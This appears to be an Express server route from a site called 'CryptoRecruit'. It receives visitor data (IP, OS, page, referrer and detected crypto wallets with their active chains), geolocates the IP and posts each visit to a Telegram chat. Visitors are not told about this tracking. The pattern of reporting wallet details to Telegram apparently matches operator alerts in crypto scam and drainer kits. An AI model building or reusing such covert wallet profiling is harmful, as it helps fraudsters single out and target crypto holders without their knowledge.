import { Router } from 'express'
import { lookupIp } from './geoip.js'
import { sanitizeClientMeta } from '../shared/clientMeta.js'
import { sanitizeWalletSnapshot } from '../shared/wallets.js'
import { sendTelegram, telegramConfigured } from './telegram.js'

const recent = new Map()
let windowStart = Date.now()
let windowCount = 0
const PATH_COOLDOWN_MS = 4000
const MAX_PER_MINUTE = 40

function clip(value, max) {
  return String(value || '').trim().slice(0, max)
}

function pagePath(body) {
  let path = clip(body.path, 200) || '/'
  if (!path.startsWith('/')) path = `/${path}`
  const search = clip(body.search, 200)
  return `${path}${search.startsWith('?') || !search ? search : `?${search}`}`
}

function allow(ip, path) {
  const now = Date.now()
  if (now - windowStart > 60_000) {
    windowStart = now
    windowCount = 0
  }
  if (windowCount >= MAX_PER_MINUTE) return false
  const key = `${ip}|${path}`
  const last = recent.get(key) || 0
  if (now - last < PATH_COOLDOWN_MS) return false
  recent.set(key, now)
  if (recent.size > 500) {
    for (const [k, at] of recent) {
      if (now - at > 30_000) recent.delete(k)
    }
  }
  windowCount += 1
  return true
}

function walletLines(wallets) {
  if (!wallets?.detected || !wallets.wallets?.length) return ['Wallets: none detected']
  const list = wallets.wallets.map((wallet) => {
    const chain = wallet.activeChain || (wallet.chains || []).filter((name) => name !== 'EVM').slice(0, 2).join(', ')
    return chain ? `${wallet.name} (${chain})` : wallet.name
  })
  const lines = [`Wallets: ${list.join(', ')}`]
  const chains = (wallets.chains || []).filter((name) => name !== 'EVM')
  if (chains.length) lines.push(`Chains: ${chains.join(', ')}`)
  if (wallets.activeEvmChain) lines.push(`Active EVM: ${wallets.activeEvmChain}`)
  return lines
}

function visitMessage(visit) {
  const lines = [
    'CryptoRecruit visit',
    `Page: ${visit.path}`,
    visit.title ? `Title: ${visit.title}` : '',
    `IP: ${visit.ip || 'unknown'}`,
    visit.geo ? `Location: ${visit.geo}` : '',
    `OS: ${visit.os || 'unknown'}`,
    ...walletLines(visit.wallets),
    visit.referrer ? `From: ${visit.referrer}` : 'From: direct',
    `Time: ${visit.at}`,
  ]
  return lines.filter(Boolean).join('\n')
}

export const visitsRouter = Router()

visitsRouter.post('/', (req, res) => {
  const body = req.body || {}
  const client = sanitizeClientMeta(body.client, req)
  const visit = {
    at: new Date().toISOString(),
    path: pagePath(body),
    title: clip(body.title, 160),
    referrer: clip(body.referrer, 300),
    ip: client.ip,
    os: client.os,
    wallets: sanitizeWalletSnapshot(body.wallets),
  }

  if (!allow(visit.ip || 'unknown', visit.path)) {
    return res.status(204).end()
  }

  if (!telegramConfigured()) {
    console.warn('[telegram] visit skipped — TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing')
    return res.status(204).end()
  }

  res.status(204).end()

  lookupIp(visit.ip)
    .then((geo) => sendTelegram(visitMessage({ ...visit, geo: geo.label || '' })))
    .then(() => console.log('[telegram] sent', visit.path, visit.ip || ''))
    .catch((error) => console.warn('[telegram] visit failed:', error.message))
})
